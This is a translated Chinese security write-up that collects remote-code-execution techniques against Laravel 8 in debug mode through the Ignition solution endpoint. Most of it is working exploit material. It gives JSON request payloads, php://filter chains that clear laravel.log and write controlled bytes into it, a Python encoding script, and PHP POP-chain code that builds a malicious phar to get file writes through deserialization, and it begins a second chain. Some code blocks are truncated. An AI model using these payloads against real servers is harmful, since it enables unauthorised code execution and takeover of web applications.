# Laravel 8 Debug mode RCE 汇总
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
环境配置
  * PHP: 7.3.4
  * Laravel：8.32.1
影响版本
  * Laravel getRunnableSolution();
            $solution->run($request->get('parameters', []));
            return response('');
        }
    }
发现有 `__invoke()` 魔法函数, 然后跟进调用的是 run 方法, 并将可控的 `parameters` 传过去, 通过这个点我们可以调用到
`MakeViewVariableOptionalSolution::run()`
    makeOptional($parameters);
            if ($output !== false) {
                file_put_contents($parameters['viewFile'], $output);
            }
        }
        ...
    }
然后跟进到 makeOptional 方法
        public function makeOptional(array $parameters = [])
        {
            $originalContents = file_get_contents($parameters['viewFile']);
            $newContents = str_replace('$'.$parameters['variableName'], '$'.$parameters['variableName']." ?? ''", $originalContents);
            $originalTokens = token_get_all(Blade::compileString($originalContents));
            $newTokens = token_get_all(Blade::compileString($newContents));
            $expectedTokens = $this->generateExpectedTokens($originalTokens, $parameters['variableName']);
            if ($expectedTokens !== $newTokens) {
                return false;
            }
            return $newContents;
        }
体现的功能就是替换 `$variableName` 为 `$variableName ?? ''` , 之后写回文件中
由于这里调用了`file_get_contents()`, 且其中的参数可控, 所以这里可以通过`phar://`协议去触发phar反序列化
**将log转化为phar文件**
原文作者给出的一个基于框架触发 phar反序列化的方法: 将log文件变成合法的phar文件
laravel 的 log 文件在 `/storage/logs/laravel.log`
    [2021-03-14 03:47:21] production.ERROR: No application encryption key has been specified. {"exception":"[object] (Illuminate\\Encryption\\MissingAppKeyException(code: 0): No application encryption key has been specified. at D:\\phpstudy_pro\\WWW\\laravel822\\vendor\\laravel\\framework\\src\\Illuminate\\Encryption\\EncryptionServiceProvider.php:79)
    [stacktrace]
    #0 D:\\phpstudy_pro\\WWW\\laravel822\\vendor\\laravel\\framework\\src\\Illuminate\\Support\\helpers.php(263): Illuminate\\Encryption\\EncryptionServiceProvider->Illuminate\\Encryption\\{closure}(NULL)
    #1 D:\\phpstudy_pro\\WWW\\laravel822\\vendor\\laravel\\framework\\src\\Illuminate\\Encryption\\EncryptionServiceProvider.php(81): tap(NULL, Object(Closure))
    #2
    ...
原文作者在文章中提出了使用 `php://filter` 中的 `convert.base64-decode` 过滤器的特性, 将log清空
`convert.base64-decode` 会将一些非 base64 字符给过滤掉后再进行 `decode`, 所以可以通过调用多次
`convert.base64-decode` 来将 log 清空
但是也会出现非预期的状况, 如果某次 base64 编码后的 `=` 出现了别的 base64 字符
php是会报一个 Warning 的, 且由于 laravel 开启了debug模式，所以会触发 `Ignition`
生成错误页面，导致decode后的字符没有成功写入
所以我们清空 log 文件的目录大致分为底下两步操作:
  * 使 log 文件尽可能变成非 base64 字符
  * 再通过 `convert.base64-decode` 将所有非 base64 字符清空
原文作者在第一步通过多次 `convert.base64-decode` , 但是有可能会出现上述的 Warning 状况, 例如取了一次真实的
laravel.log 进行多次 `convert.base64-decode` , php报了 Warning
所以我们需要考虑另外一种方式达到第一步的目的, 我们知道 `php://filter` 还有很多解析器, 像是
`convert.base64-decode`, `string.rot13`, `string.strip_tags`,
`convert.iconv.UCS-2LE.UCS-2BE`, `convert.iconv.utf-8.utf-7` 等, 这里我们使用
`convert.iconv.utf-8.utf-16be`
    {"solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution", "parameters": {"variableName": "username", "viewFile": "php://filter/write=convert.iconv.utf-8.utf-16be/resource=../storage/logs/laravel.log"}}
结果如下
然后使用 `convert.quoted-printable-encode` 打印所有不可见的字符
再使用 `convert.iconv.utf-16be.utf-8`
这三部操作显而易见的将 log 文件内的字符变成了非 base64 字符, 这个时候再使用 `convert.base64-decode` 就可以成功清楚
log 文件
那么我们把上述步骤合并起来就达成了这两步的目的
    php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log
实现了一步清空 log 文件
**写入符合规范的phar文件**
我们可以通过 `file_get_contents` 去触发日志的记录, 也可以本地调试报错后在相关的文件夹找到 log 文件的记录
通过观察, 可以发现 log 文件大致的格式
    [时间]错误原因:错误发生的完整路径:错误发生的完整路径
    [跟踪]#0...+部分payload+...
会发现我们 file_get_contents 的完整路径会出现两次
最终需要让 log 文件变成恶意 phar 文件, 所以还得继续对 log 文件进行操作
原文作者给出的方式是 `convert.iconv.utf-16le.utf-8`
然后测试一下
我们可以再后一个 payload添加任意字符, 这样至少能有一个转义出来
这样子就是我们想要的效果, 因为除了 payload 的部分都是非 base64 字符, 只要我们将 payload
进行base64编码后再decode即可把非 base64 字符消除掉
但是这么做还会有一个问题，就是在 `file_get_contents()` 传入`\00` 的时候 php 会报一个 Warning,
同样会触发Debug页面的报错, 还需要想办法把空字节（`\00`）写入到 log 文件中
这个时候就可以使用 `convert.quoted-printable-encode`过滤器, 将不可见字符打印出来
原理就是将字符转成ascii后前面加个`=`号, 将其打印出来, `convert.quoted-printable-decode` 则是将等号后面的
ascii 字符解码并打印出来, 于是我们可以用 **=00 代替 \00** 传入到 file_get_contents 当中,
完整调用的payload是这样的
    php://filter/read=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log
**易错点1**
如果直接根据作者给出的方式生成 PAYLOAD ，在到 `convert.quoted-printable-decode` 过滤器的时候可能会出问题
把 `=` 改成 `=3D` 就不会出现此类问题
**易错点2**
我们生成的 PAYLOAD 会在 log 文件中完整出现两次以外, 还会在底下出现部分 PAYLOAD, 所以我们先将 PAYLOAD 进行一次
`convert.quoted-printable-encode`编码
**尝试写入log文件**
尝试报错后产生 log 文件, 然后一步清空
    {"solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution", "parameters": {"variableName": "username", "viewFile": "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"}}
给 log 文件加入前缀
    "viewFile": "AA"
将需要写入的字符编码
    # -*-coding:utf-8-*-    import base64
    s = base64.b64encode(b'PAYLOAD').decode('utf-8')
    r = ''.join(["=" + hex(ord(i))[2:] + "=00" for i in s]).upper()
    print(r)
    # =55=00=45=00=46=00=5A=00=54=00=45=00=39=00=42=00=52=00=41=00=3D=00=3D=00
清空干扰字符
    "viewFile": "php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
成功写入任意字符, 那 log 文件的内容我们就可控了
## POP链1
然后我们只需要完整利用, 拿自己之前挖的 payload 测试一下
    events = $events;
                $this->event = $event;
            }
        }
    }
    namespace Illuminate\Validation {
        class Validator {
            public $extensions;
            public function __construct($extensions){
                $this->extensions = $extensions;
            }
        }
    }
    namespace Illuminate\Filesystem {
        class Filesystem{
            public $path = 'ricky.php';
            public $data = '';
        }
    }
    namespace Illuminate\Auth {
        class RequestGuard {
            protected $user;
            protected $callback;
            protected $request = 'ricky.php';
            protected $provider = '';
            public function __construct($callback) {
                $this->callback = $callback;
            }
        }
    }
    namespace {
        use Illuminate\Auth\RequestGuard;
        use Illuminate\Filesystem\Filesystem;
        use Illuminate\Validation\Validator;
        use Illuminate\Broadcasting\PendingBroadcast;
        $c = new RequestGuard([new Filesystem(), 'append']);
        $b = new Validator(array(''=>'call_user_func'));
        $a = new PendingBroadcast($b, [$c, 'user']);
        $phar = new Phar("phar.phar"); //生成phar文件
        $phar->startBuffering();
        $phar->setStub('GIF89a'.'');
        $phar->setMetadata($a); //触发头是C1e4r类
        $phar->addFromString("exp.txt", "test"); //生成签名
        $phar->stopBuffering();
    }
生成 phar 文件再把里面的内容转为 base64 字符
然后 python 转换
    # -*-coding:utf-8-*-    import base64a
    s = '你的base64的payload'
    r = ''.join(["=" + hex(ord(i))[2:] + "=00" for i in s]).upper()
    print(r+'a')  # 因为后面有), 加入一个干扰字符会将我们的phar内容保留下来
然后先传入任意不存在文件报错 > 生成 log 文件 > 传入payload > 执行清空 log 文件的步骤
最后我们 phar反序列化包含即可成功
## POP链2
用 FileCookieJar 进行文件上传
    setCookie(new \GuzzleHttp\Cookie\SetCookie([
            'Name'=>'ricky',
            'Domain'=> "",
            'Expires'=>123,
            'Value'=>123
        ]));